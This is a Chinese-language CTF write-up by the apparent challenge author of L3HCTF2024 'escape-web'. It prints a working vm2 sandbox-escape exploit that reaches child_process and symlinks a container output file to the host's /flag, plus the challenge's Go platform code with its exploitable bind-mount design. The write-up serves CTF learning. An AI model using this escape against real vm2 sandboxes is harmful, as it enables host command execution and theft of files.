---
title: (L3HCTF2024)escape-web
date: 2024-02-05 00:32:00
categories: CTF
tags: [CTF]
url: /l3hctf2024-escape-web/
---

### 做题

某次测试网上在线运行代码的容器发现的好玩的玩意儿。

搓了一个平台，每次提交开一个新的容器，然后把容器的输出返回给用户。

容器里面是个 vm2 逃逸，非常之简单，详见[poc](https://gist.github.com/leesh3288/f693061e6523c97274ad5298eb2c74e9)。
但是感觉就套个这个太没意思，接下来要读容器外的 flag 文件就被拷打了。

实际上容器是把用户上传的代码写在 /tmp，然后挂载到容器里面的 /app，做题的时候可以看到 /app 下面有 output.txt 和 error.txt，这时候把 output.txt 或者 error.txt 写成软链接到 /flag 就行了。

最后可用的 exp 如下：
```javascript
async function fn() {
  (function stack() {
    new Error().stack;
    stack();
  })();
}
p = fn();
p.constructor = {
  [Symbol.species]: class FakePromise {
    constructor(executor) {
      executor(
        (x) => x,
        (err) => {
          return console.log(
            err.constructor
              .constructor("return process")()
              .mainModule.require("child_process")
              .execSync("ln -sf /flag /app/output.txt")
              .toString()
          );
        }
      );
    }
  },
};
p.then();
```

### 出题

要出这个 docker in docker 实在是太麻烦了！平台上的容器肯定不能跑特权容器，里面直接起不来 docker。

本来搞了一套 docker in qemu in docker 的方案，但是 qemu 没有 kvm 实在是慢到令人发指（请求一次得 10s 才能返回）。

没办法，最后没部署到平台上，在自己不用的机子上直接裸着跑，真逃出去也不管了。

一开始 nohup 跑的没写日志，结果上线一会儿就炸了，还好有个环境一样的备用机器，赶紧切域名解析过去，最后也不知道咋崩的。

后来大半夜又崩了一次，被外国友人拷打了，还好还没睡，又切解析到备用机。

这次被搞烦了，直接写到 systemd service 里面自动重启，懒得运维了。

部署的小鸡一台是阿里云 300 代金券薅的轻量 hk（2h1g），一台是甲骨文春川薅的 arm（4h24g）。QPS 上线之前压过，都是 10 左右，也不知道是不是 OOM 崩的。

最后把平台代码附上：
```golang
package main

import (
	"context"
	"embed"
	_ "embed"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"time"

	"github.com/docker/docker/api/types/container"
	"github.com/docker/docker/api/types/mount"
	"github.com/docker/docker/client"
	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
)

func WriteFile(path string, data []byte) error {
	err := ioutil.WriteFile(path, data, 0644)
	return err
}

func ReadFile(path string) (string, error) {
	data, err := ioutil.ReadFile(path)
	return string(data), err
}

func RunCommand(command string) (string, error) {
	cmd := exec.Command("sh", "-c", command)
	out, err := cmd.Output()
	return string(out), err
}

//go:embed app
var app_dir embed.FS

func TryExtractApp() {
	_, err := os.Stat("app")
	if err != nil {
		if os.IsNotExist(err) {
			fmt.Println("app dir not exists, extract app dir from embed fs")
			err := os.Mkdir("app", 0755)
			if err != nil {
				panic(err)
			}
			entries, err := app_dir.ReadDir("app")
			if err != nil {
				panic(err)
			}
			for _, entry := range entries {
				file_path := "app/" + entry.Name()
				fmt.Println("extracting", file_path)
				if entry.IsDir() {
					continue
				}
				file, err := app_dir.ReadFile("app/" + entry.Name())
				if err != nil {
					continue
				}
				WriteFile(file_path, file)
			}
		} else {
			panic(err)
		}
	} else {
		fmt.Println("app dir exists")
	}
}

//go:embed static/index.html
var indexHTML string

func main() {
	TryExtractApp()
	gin.SetMode(gin.ReleaseMode)
	r := gin.Default()
	r.GET("/", func(c *gin.Context) {
		c.Header("Content-Type", "text/html")
		c.String(http.StatusOK, indexHTML)
	})
	r.POST("/run", func(c *gin.Context) {
		uuid := uuid.New().String()
		// cp -r app to /tmp/uuid
		tmpPath := "/tmp/" + uuid
		RunCommand("cp -r app " + tmpPath)
		defer RunCommand("rm -rf " + tmpPath)
		code, err := c.GetRawData()
		if err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
			return
		}

		err = WriteFile(tmpPath+"/code.js", code)
		if err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
			return
		}

		ctx := context.Background()

		cl, err := client.NewClientWithOpts(client.FromEnv)
		if err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
			return
		}

		cl.NegotiateAPIVersion(ctx)

		resp, err := cl.ContainerCreate(ctx, &container.Config{
			Image:           "node:lts-alpine",
			Cmd:             []string{"/bin/sh", "-c", "node /app/dist.js > /app/output.txt 2> /app/error.txt"},
			NetworkDisabled: true,
		},
			&container.HostConfig{
				AutoRemove: true,
				Mounts: []mount.Mount{
					{
						Type:     mount.TypeBind,
						Source:   tmpPath,
						Target:   "/app",
						ReadOnly: false,
					},
				},
				Resources: container.Resources{
					Memory:    1024 * 1024 * 64,
					CPUPeriod: 100000,
					CPUQuota:  25000,
				},
			}, nil, nil, uuid)

		if err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
			return
		}

		err = cl.ContainerStart(ctx, uuid, container.StartOptions{})
		if err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
			return
		}

		statusCh, errCh := cl.ContainerWait(ctx, resp.ID, container.WaitConditionNotRunning)
		select {
		case err := <-errCh:
			if err != nil {
				c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
				return
			}
		case <-statusCh:
		case <-time.After(10 * time.Second):
			cl.ContainerKill(ctx, uuid, "KILL")
		}

		output_content, _ := ReadFile("/tmp/" + uuid + "/output.txt")
		error_content, _ := ReadFile("/tmp/" + uuid + "/error.txt")
		c.JSON(http.StatusOK, gin.H{"output": output_content, "error": error_content})
	})
	r.Run(":8080")
}
```